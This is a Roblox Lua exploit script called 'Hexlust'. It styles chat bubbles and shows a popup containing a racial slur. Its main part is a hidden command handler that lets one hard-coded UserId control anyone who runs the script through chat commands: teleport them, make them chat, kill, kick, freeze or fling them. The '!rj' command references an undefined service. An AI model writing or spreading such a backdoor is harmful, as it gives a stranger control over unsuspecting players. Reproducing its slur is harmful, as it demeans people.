-- LocalScript - Controllable by UserId 7252040461 (Commander)

local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer

-- Dark mode chat bubbles on execution
do
    -- Modern TextChatService bubble styling
    local function applyDarkBubbles()
        if TextChatService.ChatVersion ~= Enum.ChatVersion.TextChatService then return end
        
        local function styleBubble(bubble)
            if not bubble:IsA("TextLabel") then return end
            bubble.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
            bubble.TextColor3 = Color3.fromRGB(240, 240, 240)
            bubble.BackgroundTransparency = 0.1
            bubble.TextStrokeTransparency = 0.8
            bubble.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            
            local corner = bubble:FindFirstChildOfClass("UICorner") or Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 8)
            corner.Parent = bubble
            
            local stroke = bubble:FindFirstChildOfClass("UIStroke") or Instance.new("UIStroke")
            stroke.Color = Color3.fromRGB(60, 60, 60)
            stroke.Thickness = 1
            stroke.Transparency = 0.4
            stroke.Parent = bubble
        end
        
        -- Existing bubbles
        for _, bubble in ipairs(workspace:GetDescendants()) do
            if bubble:IsA("BillboardGui") and bubble.Adornee and bubble.Adornee.Parent and bubble.Adornee.Parent:FindFirstChild("Humanoid") then
                for _, child in ipairs(bubble:GetDescendants()) do
                    styleBubble(child)
                end
            end
        end
        
        -- New bubbles (listen for added)
        workspace.DescendantAdded:Connect(function(desc)
            if desc:IsA("BillboardGui") and desc.Adornee and desc.Adornee.Parent and desc.Adornee.Parent:FindFirstChild("Humanoid") then
                task.delay(0.1, function()
                    for _, child in ipairs(desc:GetDescendants()) do
                        styleBubble(child)
                    end
                end)
            end
        end)
    end

    applyDarkBubbles()
end

-- Small notification
do
    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui", 10)
    if not PlayerGui then
        warn("[Hexlust] PlayerGui not found - skipping notification")
    else
        local ScreenGui = Instance.new("ScreenGui")
        ScreenGui.Name = "HexlustNotify"
        ScreenGui.ResetOnSpawn = false
        ScreenGui.IgnoreGuiInset = true
        ScreenGui.Parent = PlayerGui

        local Frame = Instance.new("Frame")
        Frame.Size = UDim2.new(0, 240, 0, 50)
        Frame.Position = UDim2.new(0, 40, 0.5, -25)
        Frame.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
        Frame.BorderSizePixel = 0
        Frame.BackgroundTransparency = 1
        Frame.Parent = ScreenGui

        local UICorner = Instance.new("UICorner")
        UICorner.CornerRadius = UDim.new(0, 10)
        UICorner.Parent = Frame

        local Shadow = Instance.new("Frame")
        Shadow.Size = UDim2.new(1, 10, 1, 10)
        Shadow.Position = UDim2.new(0, -5, 0, -5)
        Shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        Shadow.BackgroundTransparency = 1
        Shadow.ZIndex = -1
        Shadow.Parent = Frame

        local ShadowCorner = Instance.new("UICorner")
        ShadowCorner.CornerRadius = UDim.new(0, 12)
        ShadowCorner.Parent = Shadow

        local Text = Instance.new("TextLabel")
        Text.Size = UDim2.new(1, -20, 1, -10)
        Text.Position = UDim2.new(0, 10, 0, 5)
        Text.BackgroundTransparency = 1
        Text.Text = "you executed hexlust ak nigger!"
        Text.TextColor3 = Color3.fromRGB(255, 255, 255)
        Text.TextSize = 16
        Text.Font = Enum.Font.GothamSemibold
        Text.TextTransparency = 1
        Text.TextScaled = false
        Text.TextWrapped = false
        Text.TextXAlignment = Enum.TextXAlignment.Center
        Text.TextYAlignment = Enum.TextYAlignment.Center
        Text.Parent = Frame

        local GlowText = Text:Clone()
        GlowText.TextTransparency = 1
        GlowText.TextColor3 = Color3.fromRGB(255, 255, 255)
        GlowText.TextStrokeTransparency = 0.5
        GlowText.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
        GlowText.ZIndex = -1
        GlowText.Parent = Frame

        local tweenIn = TweenInfo.new(1.1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
        local tweenOut = TweenInfo.new(1.3, Enum.EasingStyle.Sine, Enum.EasingDirection.In)

        Frame.BackgroundTransparency = 1
        Text.TextTransparency = 1
        GlowText.TextTransparency = 1
        GlowText.TextStrokeTransparency = 1
        Shadow.BackgroundTransparency = 1
        Frame.Size = UDim2.new(0, 210, 0, 42)

        TweenService:Create(Frame, tweenIn, {
            BackgroundTransparency = 0.14,
            Size = UDim2.new(0, 240, 0, 50)
        }):Play()

        TweenService:Create(Text, tweenIn, {TextTransparency = 0}):Play()
        TweenService:Create(GlowText, tweenIn, {
            TextTransparency = 0.35,
            TextStrokeTransparency = 0.5
        }):Play()
        TweenService:Create(Shadow, tweenIn, {BackgroundTransparency = 0.84}):Play()

        task.delay(2.2, function()
            TweenService:Create(Frame, tweenOut, {
                BackgroundTransparency = 1,
                Size = UDim2.new(0, 190, 0, 38)
            }):Play()

            TweenService:Create(Text, tweenOut, {TextTransparency = 1}):Play()
            TweenService:Create(GlowText, tweenOut, {
                TextTransparency = 1,
                TextStrokeTransparency = 1
            }):Play()
            TweenService:Create(Shadow, tweenOut, {BackgroundTransparency = 1}):Play()

            task.delay(1.5, function()
                if ScreenGui then ScreenGui:Destroy() end
            end)
        end)
    end
end

-- General chat channel
local GeneralChannel
pcall(function()
    GeneralChannel = TextChatService:WaitForChild("TextChannels", 10):WaitForChild("RBXGeneral", 8)
end)
if not GeneralChannel then
    warn("RBXGeneral not found - !chat commands disabled")
end

-- Helpers
local function getPlayerByPartial(partial)
    if not partial or partial == "" then return nil end
    local lower = partial:lower()
    for _, plr in Players:GetPlayers() do
        if plr.DisplayName:lower():sub(1, #lower) == lower then
            return plr
        end
    end
    return nil
end

local function getCommander()
    return Players:GetPlayerByUserId(7252040461)
end

-- Freeze state
local isFrozen = false
local origWalkSpeed = 16
local origJumpPower = 50

if LocalPlayer.Character then
    local h = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    if h then
        origWalkSpeed = h.WalkSpeed
        origJumpPower = h.JumpPower
    end
end

LocalPlayer.CharacterAdded:Connect(function(char)
    local h = char:WaitForChild("Humanoid", 5)
    if h then
        origWalkSpeed = h.WalkSpeed
        origJumpPower = h.JumpPower
        if isFrozen then
            h.WalkSpeed = 0
            h.JumpPower = 0
        end
    end
end)

-- Command handler
TextChatService.OnIncomingMessage = function(msg)
    if not msg.TextSource or msg.TextSource.UserId ~= 7252040461 then return nil end

    local text = msg.Text
    local lowerText = text:lower()
    local args = lowerText:split(" ")
    if #args < 1 then return nil end

    local cmd = args[1]

    if cmd == "!bring" and #args >= 2 then
        local tgtArg = args[2]
        local dest = nil
        local toIndex
        for i = 3, #args do
            if args[i] == "to" then toIndex = i break end
        end
        if toIndex and toIndex + 1 <= #args then
            dest = getPlayerByPartial(table.concat(args, " ", toIndex + 1))
        end

        local doTp = (tgtArg == "all") or LocalPlayer.DisplayName:lower():sub(1, #tgtArg) == tgtArg
        if doTp then
            local toPivot
            if dest and dest.Character and dest.Character.PrimaryPart then
                toPivot = dest.Character:GetPivot()
            else
                local cmdr = getCommander()
                if cmdr and cmdr.Character and cmdr.Character.PrimaryPart then
                    toPivot = cmdr.Character:GetPivot()
                end
            end
            if toPivot and LocalPlayer.Character and LocalPlayer.Character.PrimaryPart then
                LocalPlayer.Character:PivotTo(toPivot)
            end
        end
        return nil

    elseif cmd == "!chat" and #args >= 3 then
        local tgtArg = args[2]
        local msgIdx = text:find(" ", text:find(" ", 1) + 1) or #text
        local chatText = text:sub(msgIdx + 1):match("^%s*(.-)%s*$")
        if chatText == "" then return nil end

        local doChat = (tgtArg == "all") or LocalPlayer.DisplayName:lower():sub(1, #tgtArg) == tgtArg
        if doChat and GeneralChannel then
            task.spawn(function()
                pcall(GeneralChannel.SendAsync, GeneralChannel, chatText)
            end)
        end
        return nil

    elseif cmd == "!kill" and #args >= 2 then
        local tgtArg = args[2]
        local doIt = (tgtArg == "all") or LocalPlayer.DisplayName:lower():sub(1, #tgtArg) == tgtArg
        if doIt and LocalPlayer.Character then
            local h = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            if h then h.Health = 0 end
        end
        return nil

    elseif cmd == "!kick" and #args >= 2 then
        local tgtArg = args[2]
        local doIt = (tgtArg == "all") or LocalPlayer.DisplayName:lower():sub(1, #tgtArg) == tgtArg
        if doIt then LocalPlayer:Kick("sorri twin dada kicked u ;c") end
        return nil

    elseif cmd == "!rj" and #args >= 2 then
        local tgtArg = args[2]
        local doIt = (tgtArg == "all") or LocalPlayer.DisplayName:lower():sub(1, #tgtArg) == tgtArg
        if doIt then TeleportService:Teleport(game.PlaceId, LocalPlayer) end
        return nil

    elseif cmd == "!freeze" and #args >= 2 then
        local tgtArg = args[2]
        local doIt = (tgtArg == "all") or LocalPlayer.DisplayName:lower():sub(1, #tgtArg) == tgtArg
        if doIt and LocalPlayer.Character then
            local h = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            if h then
                isFrozen = true
                h.WalkSpeed = 0
                h.JumpPower = 0
            end
        end
        return nil

    elseif cmd == "!unfreeze" and #args >= 2 then
        local tgtArg = args[2]
        local doIt = (tgtArg == "all") or LocalPlayer.DisplayName:lower():sub(1, #tgtArg) == tgtArg
        if doIt and LocalPlayer.Character then
            local h = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            if h then
                isFrozen = false
                h.WalkSpeed = origWalkSpeed
                h.JumpPower = origJumpPower
            end
        end
        return nil

    elseif cmd == "!fling" and #args >= 2 then
        local tgtArg = args[2]
        local doIt = (tgtArg == "all") or LocalPlayer.DisplayName:lower():sub(1, #tgtArg) == tgtArg

        if doIt and LocalPlayer.Character then
            local root = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            if root and hum then
                hum.PlatformStand = true
                hum:ChangeState(Enum.HumanoidStateType.Physics)

                for _, child in ipairs(root:GetChildren()) do
                    if child:IsA("Attachment") or child:IsA("LinearVelocity") or child:IsA("AngularVelocity") then
                        child:Destroy()
                    end
                end

                local attach = Instance.new("Attachment")
                attach.Name = "FlingAttach"
                attach.Parent = root

                local linVel = Instance.new("LinearVelocity")
                linVel.Attachment0 = attach
                linVel.MaxAxesForce = Vector3.new(1e6, 1e6, 1e6)
                linVel.VectorVelocity = Vector3.new(
                    math.random(-60, 60),
                    math.random(250, 350),
                    math.random(-60, 60)
                )
                linVel.Parent = root

                local angVel = Instance.new("AngularVelocity")
                angVel.Attachment0 = attach
                angVel.MaxTorque = 1e6
                angVel.AngularVelocity = Vector3.new(math.random(-25,25), math.random(-50,50), math.random(-25,25))
                angVel.Parent = root

                task.delay(9, function()
                    if linVel then linVel:Destroy() end
                    if angVel then angVel:Destroy() end
                    if attach then attach:Destroy() end
                    if hum and hum.Health > 0 then
                        hum.PlatformStand = false
                        local explode = Instance.new("Explosion")
                        explode.Position = root.Position + Vector3.new(0,5,0)
                        explode.BlastPressure = 0
                        explode.BlastRadius = 8
                        explode.DestroyJointRadiusPercent = 0
                        explode.Parent = workspace
                        hum.Health = 0
                    end
                end)
            end
        end
        return nil
    end

    return nil
end
